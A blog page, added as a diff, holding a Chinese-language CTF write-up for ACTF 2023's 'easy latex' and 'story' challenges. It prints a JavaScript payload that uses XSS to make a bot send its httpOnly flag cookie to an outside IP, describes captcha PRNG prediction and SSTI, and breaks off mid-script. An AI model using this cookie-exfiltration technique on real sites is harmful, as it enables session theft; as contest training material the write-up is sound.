@@ -1,0 +1,343 @@
+<!doctype html>
+<html lang="en-us"><head>
+    <title>an4er&#39; blog</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="" />
+
+    
+    
+    
+    <link rel="stylesheet" href="../../css/theme.min.css">
+
+    
+    
+    
+
+    
+</head>
+<body>
+        <div id="content" class="mx-auto"><header class="container mt-sm-5 mt-4 mb-4 mt-xs-1">
+    <div class="row">
+        
+        <div class="col-sm-4 col-12 text-sm-right text-center pt-sm-4">
+            <a href="../../" class="text-decoration-none">
+                <img id="home-image" class="rounded-circle"
+                    
+                        
+                            src="../../avatar.jpg"
+                        
+                    
+                />
+            </a>
+        </div>
+        <div class="col-sm-8 col-12 text-sm-left text-center">
+        
+            <h2 class="m-0 mb-2 mt-4">
+                <a href="../../" class="text-decoration-none">
+                    
+                        an4er
+                    
+                </a>
+            </h2>
+            <p class="text-muted mb-1">
+                
+                    Want to be a Ctfer, Developer, Red Team
+                
+            </p>
+            <ul id="nav-links" class="list-inline mb-2">
+                
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../about/" title="About">About</a>
+                    </li>
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../post/" title="Posts">Posts</a>
+                    </li>
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../categories/" title="Categories">Categories</a>
+                    </li>
+                
+            </ul>
+            <ul id="nav-social" class="list-inline">
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="https://github.com/an5er" target="_blank">
+                            <i class="fab fa-github fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+    <hr />
+</header>
+<div class="container">
+    <div class="pl-sm-2">
+        <div class="mb-3">
+            <h3 class="mb-0">ACTF2023 WP</h3>
+            
+            <small class="text-muted">Published October 31, 2023</small>
+        </div>
+
+        <article>
+            <p>周末看了下ACTF的题目，在这里做个记录</p>
+<h2 id="easy-latex">easy latex</h2>
+<p>题目起手先在bot里面看到了flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/an5er/cloudimg@main/blog/202310312110694.png" alt="image-20231031211020499"></p>
+<p>可是被设置为了<code>httpOnly</code>，也就是我们不可能使用xss去获得flag，查看其应用路由。在vip中发现</p>
+<p><img src="https://cdn.jsdelivr.net/gh/an5er/cloudimg@main/blog/202310312111359.png" alt="image-20231031211130263"></p>
+<p>它获取了请求中的cookie，将其重新拼装后发送请求，也就是我们的bot只要向vip 路由发送post请求就能拿其Cookie，但是我们需要外带的话，需要控制其username为我们监听的地址或者webhook。最后就是找个地方能触发JS脚本执行的地方，外带脚本如下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://localhost:3000/login&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">requestBody</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;username=http%3A%2F%2F49.232.214.202%3A5000%2F&amp;password=add29f48a5ae410bd6e875c8cd1ab8b7&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fetch</span>(<span style="color:#a6e22e">url</span>, {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;POST&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 设置请求头
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Host&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;localhost:3000&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Accept&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;textml,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Accept-Language&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Accept-Encoding&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;gzip, deflate, br&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Referer&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;http://localhost:3000/login&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Content-Type&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;application/x-www-form-urlencoded&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Content-Length&#34;</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">requestBody</span>.<span style="color:#a6e22e">length</span>.<span style="color:#a6e22e">toString</span>(),
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Origin&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;http://localhost:3000&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;DNT&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;1&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Connection&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;close&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Upgrade-Insecure-Requests&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;1&#34;</span>,
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">requestBody</span>,
+</span></span><span style="display:flex;"><span>})
+</span></span><span style="display:flex;"><span>    .<span style="color:#a6e22e">then</span>(<span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">response</span>) =&gt; {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">100</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;http://localhost:3000/vip&#39;</span>, {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;POST&#39;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({ <span style="color:#a6e22e">code</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;3672953f54673678&#34;</span> }),
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;Content-Type&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;application/json&#39;</span>,
+</span></span><span style="display:flex;"><span>            },
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">credentials</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;include&#39;</span>,
+</span></span><span style="display:flex;"><span>        });
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">sleep</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">time</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> Promise(<span style="color:#a6e22e">resolve</span> =&gt; <span style="color:#a6e22e">setTimeout</span>(<span style="color:#a6e22e">resolve</span>, <span style="color:#a6e22e">time</span>));
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>路由内可以造成XSS就两个点，一个preview一个note，但是note需要登录，看了下逻辑不太可能去绕过VIP，然后试了下在puppeteer中是可以使用<code>../</code>去逃逸出固定的路由的，所以可以使用<code>preview</code>去触发XSS这个点</p>
+<p>在<code>preview</code>路由中</p>
+<p><img src="https://cdn.jsdelivr.net/gh/an5er/cloudimg@main/blog/202310312116991.png" alt="image-20231031211606922"></p>
+<p>我们的<code>theme</code>可控，然后渲染页面后会去加载<code>/js/base.js</code>，所以我们只要将上面的脚本放在服务器上，让其加载就能造成<code>XSS</code></p>
+<h2 id="story">story</h2>
+<p>看了下代码第一眼：致敬Jumpserver哈哈哈哈</p>
+<p>实例化Captcha播种，其中的key可以通过发送访问请求和第一次random来算出来，然后就是计算在实例化后到发送VIP经过几次random可以算出来成为VIP需要的验证码，我这里是先登录后播种再去成为VIP，所以只要算<code>/captcha和/vip</code>路由的即可，然后就是SSTI，选一条好绕的开爆就完事了</p>
+<p>计算脚本：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> random
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> typing <span style="color:#66d9ef">as</span> t
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> PIL.Image <span style="color:#f92672">import</span> new <span style="color:#66d9ef">as</span> createImage, Image, QUAD, BILINEAR
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> PIL.ImageDraw <span style="color:#f92672">import</span> Draw, ImageDraw
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> PIL.ImageFilter <span style="color:#f92672">import</span> SMOOTH
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> PIL.ImageFont <span style="color:#f92672">import</span> FreeTypeFont, truetype
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> io <span style="color:#f92672">import</span> BytesIO
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> jwt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask_jwt_extended <span style="color:#f92672">import</span>  decode_token
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask_unsign <span style="color:#f92672">import</span> decode
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ColorTuple <span style="color:#f92672">=</span> t<span style="color:#f92672">.</span>Union[t<span style="color:#f92672">.</span>Tuple[int, int, int], t<span style="color:#f92672">.</span>Tuple[int, int, int, int]]
+</span></span><span style="display:flex;"><span>DATA_DIR <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>abspath(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>dirname(__file__)), <span style="color:#e6db74">&#39;data&#39;</span>)
+</span></span><span style="display:flex;"><span>DEFAULT_FONTS <span style="color:#f92672">=</span> [os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(DATA_DIR, <span style="color:#e6db74">&#39;DroidSansMono.ttf&#39;</span>)]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">generate_code</span>(length: int <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>):
+</span></span><span style="display:flex;"><span>    characters <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(random<span style="color:#f92672">.</span>choice(characters) <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(length))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">random_color</span>(start: int, end: int, opacity: t<span style="color:#f92672">.</span>Optional[int] <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>) <span style="color:#f92672">-&gt;</span> ColorTuple:
+</span></span><span style="display:flex;"><span>    red <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(start, end)
+</span></span><span style="display:flex;"><span>    green <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(start, end)
+</span></span><span style="display:flex;"><span>    blue <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(start, end)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> opacity <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> (red, green, blue)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> (red, green, blue, opacity)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Captcha</span>:
+</span></span><span style="display:flex;"><span>    lookup_table: t<span style="color:#f92672">.</span>List[int] <span style="color:#f92672">=</span> [int(i <span style="color:#f92672">*</span> <span style="color:#ae81ff">1.97</span>) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>)]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self, width: int <span style="color:#f92672">=</span> <span style="color:#ae81ff">160</span>, height: int <span style="color:#f92672">=</span> <span style="color:#ae81ff">60</span>, key: int <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>, length: int <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>,
+</span></span><span style="display:flex;"><span>                 fonts: t<span style="color:#f92672">.</span>Optional[t<span style="color:#f92672">.</span>List[str]] <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>, font_sizes: t<span style="color:#f92672">.</span>Optional[t<span style="color:#f92672">.</span>Tuple[int]] <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>):
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>_width <span style="color:#f92672">=</span> width
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>_height <span style="color:#f92672">=</span> height
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>_length <span style="color:#f92672">=</span> length
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>_key <span style="color:#f92672">=</span> key
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>_fonts <span style="color:#f92672">=</span> fonts <span style="color:#f92672">or</span> DEFAULT_FONTS
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>_font_sizes <span style="color:#f92672">=</span> font_sizes <span style="color:#f92672">or</span> (<span style="color:#ae81ff">42</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">56</span>)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>_truefonts: t<span style="color:#f92672">.</span>List[FreeTypeFont] <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># random.seed(self._key)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@property</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">truefonts</span>(self) <span style="color:#f92672">-&gt;</span> t<span style="color:#f92672">.</span>List[FreeTypeFont]:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>_truefonts:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>_truefonts
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>_truefonts <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>            truetype(n, s)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> n <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>_fonts
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> s <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>_font_sizes
+</span></span><span style="display:flex;"><span>        ]
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>_truefonts
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@staticmethod</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create_noise_curve</span>(image: Image, color: ColorTuple) <span style="color:#f92672">-&gt;</span> Image:
+</span></span><span style="display:flex;"><span>        w, h <span style="color:#f92672">=</span> image<span style="color:#f92672">.</span>size
+</span></span><span style="display:flex;"><span>        x1 <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">0</span>, int(w <span style="color:#f92672">/</span> <span style="color:#ae81ff">5</span>))
+</span></span><span style="display:flex;"><span>        x2 <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(w <span style="color:#f92672">-</span> int(w <span style="color:#f92672">/</span> <span style="color:#ae81ff">5</span>), w)
+</span></span><span style="display:flex;"><span>        y1 <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(int(h <span style="color:#f92672">/</span> <span style="color:#ae81ff">5</span>), h <span style="color:#f92672">-</span> int(h <span style="color:#f92672">/</span> <span style="color:#ae81ff">5</span>))
+</span></span><span style="display:flex;"><span>        y2 <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(y1, h <span style="color:#f92672">-</span> int(h <span style="color:#f92672">/</span> <span style="color:#ae81ff">5</span>))
+</span></span><span style="display:flex;"><span>        points <span style="color:#f92672">=</span> [x1, y1, x2, y2]
+</span></span><span style="display:flex;"><span>        end <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">160</span>, <span style="color:#ae81ff">200</span>)
+</span></span><span style="display:flex;"><span>        start <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">20</span>)
+</span></span><span style="display:flex;"><span>        Draw(image)<span style="color:#f92672">.</span>arc(points, start, end, fill<span style="color:#f92672">=</span>color)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> image
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@staticmethod</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create_noise_dots</span>(image: Image, color: ColorTuple, width: int <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>, number: int <span style="color:#f92672">=</span> <span style="color:#ae81ff">30</span>) <span style="color:#f92672">-&gt;</span> Image:
+</span></span><span style="display:flex;"><span>        draw <span style="color:#f92672">=</span> Draw(image)
+</span></span><span style="display:flex;"><span>        w, h <span style="color:#f92672">=</span> image<span style="color:#f92672">.</span>size
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> number:
+</span></span><span style="display:flex;"><span>            x1 <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">0</span>, w)
+</span></span><span style="display:flex;"><span>            y1 <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">0</span>, h)
+</span></span><span style="display:flex;"><span>            draw<span style="color:#f92672">.</span>line(((x1, y1), (x1 <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>, y1 <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)), fill<span style="color:#f92672">=</span>color, width<span style="color:#f92672">=</span>width)
+</span></span><span style="display:flex;"><span>            number <span style="color:#f92672">-=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> image
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_draw_character</span>(self, c: str, draw: ImageDraw, color: ColorTuple) <span style="color:#f92672">-&gt;</span> Image:
+</span></span><span style="display:flex;"><span>        font <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>choice(self<span style="color:#f92672">.</span>truefonts)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        left, top, right, bottom <span style="color:#f92672">=</span> draw<span style="color:#f92672">.</span>textbbox((<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>), c, font<span style="color:#f92672">=</span>font)
+</span></span><span style="display:flex;"><span>        w <span style="color:#f92672">=</span> int((right <span style="color:#f92672">-</span> left)<span style="color:#f92672">*</span><span style="color:#ae81ff">1.7</span>) <span style="color:#f92672">or</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>        h <span style="color:#f92672">=</span> int((bottom <span style="color:#f92672">-</span> top)<span style="color:#f92672">*</span><span style="color:#ae81ff">1.7</span>) <span style="color:#f92672">or</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        dx1 <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">4</span>)
+</span></span><span style="display:flex;"><span>        dy1 <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">6</span>)
+</span></span><span style="display:flex;"><span>        im <span style="color:#f92672">=</span> createImage(<span style="color:#e6db74">&#39;RGBA&#39;</span>, (w <span style="color:#f92672">+</span> dx1, h <span style="color:#f92672">+</span> dy1))
+</span></span><span style="display:flex;"><span>        Draw(im)<span style="color:#f92672">.</span>text((dx1, dy1), c, font<span style="color:#f92672">=</span>font, fill<span style="color:#f92672">=</span>color)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># rotate</span>
+</span></span><span style="display:flex;"><span>        im <span style="color:#f92672">=</span> im<span style="color:#f92672">.</span>crop(im<span style="color:#f92672">.</span>getbbox())
+</span></span><span style="display:flex;"><span>        im <span style="color:#f92672">=</span> im<span style="color:#f92672">.</span>rotate(random<span style="color:#f92672">.</span>uniform(<span style="color:#f92672">-</span><span style="color:#ae81ff">30</span>, <span style="color:#ae81ff">30</span>), BILINEAR, expand<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># warp</span>
+</span></span><span style="display:flex;"><span>        dx2 <span style="color:#f92672">=</span> w <span style="color:#f92672">*</span> random<span style="color:#f92672">.</span>uniform(<span style="color:#ae81ff">0.1</span>, <span style="color:#ae81ff">0.3</span>)
+</span></span><span style="display:flex;"><span>        dy2 <span style="color:#f92672">=</span> h <span style="color:#f92672">*</span> random<span style="color:#f92672">.</span>uniform(<span style="color:#ae81ff">0.2</span>, <span style="color:#ae81ff">0.3</span>)
+</span></span><span style="display:flex;"><span>        x1 <span style="color:#f92672">=</span> int(random<span style="color:#f92672">.</span>uniform(<span style="color:#f92672">-</span>dx2, dx2))
+</span></span><span style="display:flex;"><span>        y1 <span style="color:#f92672">=</span> int(random<span style="color:#f92672">.</span>uniform(<span style="color:#f92672">-</span>dy2, dy2))
+</span></span><span style="display:flex;"><span>        x2 <span style="color:#f92672">=</span> int(random<span style="color:#f92672">.</span>uniform(<span style="color:#f92672">-</span>dx2, dx2))
+</span></span><span style="display:flex;"><span>        y2 <span style="color:#f92672">=</span> int(random<span style="color:#f92672">.</span>uniform(<span style="color:#f92672">-</span>dy2, dy2))
+</span></span><span style="display:flex;"><span>        w2 <span style="color:#f92672">=</span> w <span style="color:#f92672">+</span> abs(x1) <span style="color:#f92672">+</span> abs(x2)
+</span></span><span style="display:flex;"><span>        h2 <span style="color:#f92672">=</span> h <span style="color:#f92672">+</span> abs(y1) <span style="color:#f92672">+</span> abs(y2)
+</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> (
+</span></span><span style="display:flex;"><span>            x1, y1,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">-</span>x1, h2 <span style="color:#f92672">-</span> y2,
+</span></span><span style="display:flex;"><span>            w2 <span style="color:#f92672">+</span> x2, h2 <span style="color:#f92672">+</span> y2,
+</span></span><span style="display:flex;"><span>            w2 <span style="color:#f92672">-</span> x2, <span style="color:#f92672">-</span>y1,
+</span></span><span style="display:flex;"><span>        )
+</span></span><span style="display:flex;"><span>        im <span style="color:#f92672">=</span> im<span style="color:#f92672">.</span>resize((w2, h2))
+</span></span><span style="display:flex;"><span>        im <span style="color:#f92672">=</span> im<span style="color:#f92672">.</span>transform((w, h), QUAD, data)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> im
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create_captcha_image</span>(self, chars: str, color: ColorTuple, background: ColorTuple) <span style="color:#f92672">-&gt;</span> Image:
+</span></span><span style="display:flex;"><span>        image <span style="color:#f92672">=</span> createImage(<span style="color:#e6db74">&#39;RGB&#39;</span>, (self<span style="color:#f92672">.</span>_width, self<span style="color:#f92672">.</span>_height), background)
+</span></span><span style="display:flex;"><span>        draw <span style="color:#f92672">=</span> Draw(image)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        images: t<span style="color:#f92672">.</span>List[Image] <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> chars:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> random<span style="color:#f92672">.</span>random() <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0.5</span>:
+</span></span><span style="display:flex;"><span>                images<span style="color:#f92672">.</span>append(self<span style="color:#f92672">.</span>_draw_character(<span style="color:#e6db74">&#34; &#34;</span>, draw, color))
+</span></span><span style="display:flex;"><span>            images<span style="color:#f92672">.</span>append(self<span style="color:#f92672">.</span>_draw_character(c, draw, color))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        text_width <span style="color:#f92672">=</span> sum([im<span style="color:#f92672">.</span>size[<span style="color:#ae81ff">0</span>] <span style="color:#66d9ef">for</span> im <span style="color:#f92672">in</span> images])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        width <span style="color:#f92672">=</span> max(text_width, self<span style="color:#f92672">.</span>_width)
+</span></span><span style="display:flex;"><span>        image <span style="color:#f92672">=</span> image<span style="color:#f92672">.</span>resize((width, self<span style="color:#f92672">.</span>_height))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        average <span style="color:#f92672">=</span> int(text_width <span style="color:#f92672">/</span> len(chars))
+</span></span><span style="display:flex;"><span>        rand <span style="color:#f92672">=</span> int(<span style="color:#ae81ff">0.25</span> <span style="color:#f92672">*</span> average)
+</span></span><span style="display:flex;"><span>        offset <span style="color:#f92672">=</span> int(average <span style="color:#f92672">*</span> <span style="color:#ae81ff">0.1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> im <span style="color:#f92672">in</span> images:
+</span></span><span style="display:flex;"><span>            w, h <span style="color:#f92672">=</span> im<span style="color:#f92672">.</span>size
+</span></span><span style="display:flex;"><span>            mask <span style="color:#f92672">=</span> im<span style="color:#f92672">.</span>convert(<span style="color:#e6db74">&#39;L&#39;</span>)<span style="color:#f92672">.</span>point(self<span style="color:#f92672">.</span>lookup_table)
+</span></span><span style="display:flex;"><span>            image<span style="color:#f92672">.</span>paste(im, (offset, int((self<span style="color:#f92672">.</span>_height <span style="color:#f92672">-</span> h) <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>)), mask)
+</span></span><span style="display:flex;"><span>            offset <span style="color:#f92672">=</span> offset <span style="color:#f92672">+</span> w <span style="color:#f92672">+</span> random<span style="color:#f92672">.</span>randint(<span style="color:#f92672">-</span>rand, <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> width <span style="color:#f92672">&gt;</span> self<span style="color:#f92672">.</span>_width:
+</span></span><span style="display:flex;"><span>            image <span style="color:#f92672">=</span> image<span style="color:#f92672">.</span>resize((self<span style="color:#f92672">.</span>_width, self<span style="color:#f92672">.</span>_height))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> image
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">generate_image</span>(self, chars: str) <span style="color:#f92672">-&gt;</span> Image:
